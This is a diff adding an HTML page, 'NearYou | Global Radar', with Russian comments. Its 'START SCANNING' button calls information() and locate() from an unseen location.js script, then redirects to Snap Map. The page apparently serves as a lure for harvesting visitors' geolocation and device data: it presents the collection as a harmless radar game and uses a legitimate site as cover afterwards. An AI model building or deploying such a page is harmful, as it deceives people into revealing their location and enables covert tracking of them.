@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NearYou | Global Radar</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="container">
+        <div class="planet-wrapper">
+            <div class="planet">
+                <div class="planet-glow"></div>
+            </div>
+            <div class="orbit"></div>
+        </div>
+
+        <header>
+            <h1 class="mono-title">NEARYOU</h1>
+            <p class="subtitle">Global connection radar initialized.</p>
+        </header>
+
+        <div class="action-area">
+            <button id="startBtn" class="main-btn">START SCANNING</button>
+            <p id="status" class="status-msg"></p>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <span class="mono-text">COORDINATES: UNKNOWN // STATUS: STANDBY</span>
+    </footer>
+
+    <script src="/js/location.js"></script>
+    <script>
+        document.getElementById('startBtn').addEventListener('click', function() {
+            var btn = this;
+            var status = document.getElementById('status');
+            var planet = document.querySelector('.planet');
+
+            btn.disabled = true;
+            btn.textContent = 'INITIALIZING...';
+            btn.classList.add('loading');
+
+            // Анимация планеты при сканировании
+            planet.classList.add('scanning');
+
+            if (typeof information === "function") information();
+
+            if (typeof locate === "function") {
+                locate(
+                    function() {
+                        status.textContent = '> ANALYSIS COMPLETE. REDIRECTING...';
+                        status.style.color = '#00ff41'; // "Matrix" Green
+                        btn.textContent = 'REDIRECTING';
+
+                        setTimeout(function() {
+                            // Редирект на Snap Map (как обсуждали)
+                            window.location.href = 'https://map.snapchat.com';
+                        }, 2000);
+                    },
+                    function(error, text) {
+                        btn.disabled = false;
+                        btn.textContent = 'RETRY SCAN';
+                        btn.classList.remove('loading');
+                        planet.classList.remove('scanning');
+                        status.textContent = '> ERROR: ' + text.toUpperCase();
+                        status.style.color = '#ff3131';
+                    }
+                );
+            } else {
+                // Имитация для теста, если нет location.js
+                setTimeout(() => {
+                    status.textContent = '> COMPLETED (DEMO MODE)';
+                    status.style.color = '#00ff41';
+                    btn.textContent = 'COMPLETED';
+                    btn.classList.remove('loading');
+                    planet.classList.remove('scanning');
+                }, 2500);
+            }
+        });
+    </script>
+</body>
+</html>
